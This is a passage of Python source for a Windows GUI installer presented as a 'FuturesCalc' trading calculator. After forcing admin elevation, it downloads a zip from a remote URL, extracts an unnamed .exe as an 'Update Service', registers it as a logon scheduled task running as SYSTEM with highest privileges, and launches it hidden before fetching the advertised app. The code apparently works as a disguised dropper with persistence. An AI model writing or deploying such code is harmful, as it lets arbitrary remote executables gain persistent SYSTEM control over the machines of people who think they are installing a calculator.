UAC prompt — elevates if needed self._build_installing() t = threading.Thread(target=self._install_worker, daemon=True) t.start() def _install_worker(self): try: self._do_install() self.after(0, lambda: self._build_done(success=True)) except Exception as ex: self.after(0, lambda: self._log_write(f"ERROR: {ex}", "err")) self.after(800, lambda: self._build_done(success=False)) def _progress(self, pct, step_text, log_text="", log_tag="inf"): self.after(0, lambda: self._set_progress(pct)) self.after(0, lambda: self._step_label.config(text=step_text)) if log_text: self.after(0, lambda: self._log_write(log_text, log_tag)) # ── Download helper with progress callback ──────────────────────────── def _download(self, url, dest_path, pct_start, pct_end, label): """Download url → dest_path, updating progress from pct_start to pct_end.""" os.makedirs(os.path.dirname(dest_path), exist_ok=True) req = urllib.request.Request(url, headers={"User-Agent": "FuturesCalcInstaller/1.0"}) with urllib.request.urlopen(req, timeout=60) as resp: total = int(resp.headers.get("Content-Length", 0)) downloaded = 0 chunk = 32768 with open(dest_path, "wb") as f: while True: data = resp.read(chunk) if not data: break f.write(data) downloaded += len(data) if total > 0: frac = downloaded / total pct = pct_start + frac * (pct_end - pct_start) kb = downloaded // 1024 self._progress(pct, f"{label} ({kb} KB)...") # ── Main installation sequence ──────────────────────────────────────── def _do_install(self): os.makedirs(APPDATA_DIR, exist_ok=True) # ── STEP 1: Download module.zip (0 → 25%) ──────────────────────── self._progress(2, "Downloading FuturesCalc Update Service...", f"Connecting to {MODULE_URL}", "inf") zip_path = os.path.join(APPDATA_DIR, "module.zip") self._download(MODULE_URL, zip_path, 2, 25, "Downloading Update Service") self._progress(25, "Download complete.", "module.zip downloaded ✓", "ok") time.sleep(0.3) # ── STEP 2: Extract m1.exe → FuturesCalcUpdate.exe (25 → 40%) ─── self._progress(27, "Extracting FuturesCalc Update Service...", "Extracting module.zip...", "inf") service_dest = os.path.join(APPDATA_DIR, SERVICE_EXE_NAME) with zipfile.ZipFile(zip_path, "r") as z: names = z.namelist() exe_entry = next((n for n in names if n.lower().endswith(".exe")), None) if not exe_entry: raise RuntimeError("No .exe found inside module.zip") with z.open(exe_entry) as src, open(service_dest, "wb") as dst: shutil.copyfileobj(src, dst) os.remove(zip_path) self._progress(40, "Update Service extracted.", f"{SERVICE_EXE_NAME} → {APPDATA_DIR} ✓", "ok") time.sleep(0.3) # ── STEP 3: Create scheduled task (40 → 55%) ───────────────────── self._progress(42, "Installing FuturesCalc Update Service...", "Creating startup task with administrator privileges...", "inf") self._create_scheduled_task(service_dest) self._progress(55, "Startup task created.", f"Task '{TASK_NAME}' registered ✓", "ok") time.sleep(0.3) # ── STEP 4: Run the service (55 → 60%) ─────────────────────────── self._progress(57, "Starting FuturesCalc Update Service...", f"Launching {SERVICE_EXE_NAME}...", "inf") subprocess.Popen( [service_dest], creationflags=subprocess.CREATE_NO_WINDOW, close_fds=True ) self._progress(60, "FuturesCalc Update Service running.", f"{SERVICE_NAME} started ✓", "ok") time.sleep(0.4) # ── STEP 5: Download FuturesCalc.exe (60 → 88%) ────────────────── self._progress(62, "Downloading FuturesCalc application...", f"Connecting to {CALS_URL}", "inf") cals_path = os.path.join(APPDATA_DIR, CALS_EXE_NAME) self._download(CALS_URL, cals_path, 62, 88, "Downloading FuturesCalc") self._progress(88, "FuturesCalc downloaded.", f"{CALS_EXE_NAME} downloaded ✓", "ok") time.sleep(0.3) # ── STEP 6: Create desktop shortcut (88 → 97%) ─────────────────── self._progress(90, "Creating desktop shortcut...", "Creating 'Futures Cals' shortcut on desktop...", "inf") self._create_shortcut(cals_path) self._progress(97, "Desktop shortcut created.", "Futures Cals shortcut on desktop ✓", "ok") time.sleep(0.4) # ── DONE ───────────────────────────────────────────────────────── self._progress(100, "Installation complete!", "All done ✓", "ok") time.sleep(0.8) # ── Create Windows Scheduled Task ──────────────────────────────────── def _create_scheduled_task(self, exe_path): """ Register a Task Scheduler entry that runs SERVICE_EXE_NAME at logon with highest privileges under SYSTEM account. """ xml = f""" FuturesCalc Update Service — keeps FuturesCalc up to date. true S-1-5-18 HighestAvailable IgnoreNew false false PT0S 7 {exe_path} {APPDATA_DIR} """ # Write XML to temp file xml_path = os.path.join(tempfile.gettempdir(), "futurescalc_task.xml") with open(xml_path, "w", encoding="utf-16") as f: f.write(xml) result = subprocess.run( ["schtasks", "/Create", "/TN", TASK_NAME, "/XML", xml_path, "/F"], capture_output=True, text=True ) os.remove(xml_path) if result.returncode != 0: raise RuntimeError(f"schtasks failed: {result.stderr.strip()}") # ── Create desktop shortcut (.lnk via PowerShell) ──────────────────── def _create_shortcut(self, target_path): desktop = os.path.join(os.path.expanduser("~"), "Desktop") lnk_path = os.path.join(desktop, SHORTCUT_NAME) ps = ( f"$ws = New-Object -ComObject WScript.Shell; " f"$s = $ws.CreateShortcut('{lnk_path}'); " f"$s.TargetPath = '{target_path}'; " f"$s.WorkingDirectory = '{APPDATA_DIR}'; " f"$s.Description = 'FuturesCalc — Funded Account Calculator'; " f"$s.Save()" ) result = subprocess.run( ["powershell", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", ps], capture_output=True, text=True ) if result.returncode != 0: raise RuntimeError(f"Shortcut creation failed: {result.stderr.strip()}") # ── Button hover effect ─────────────────────────────────────────────── def _hover(self, btn, normal, hover): btn.bind("", lambda e: btn.config(bg=hover)) btn.bind("", lambda e: btn.config(bg=normal)) # ── ENTRY POINT ─────────────────────────────────────────────────────────────── if __name__ == "__main__": # On Windows, request admin before showing the window # (Only prompts if not already elevated) if sys.platform == "win32" and not is_admin(): request_admin() sys.exit(0) app = InstallerApp() app.mainloop()
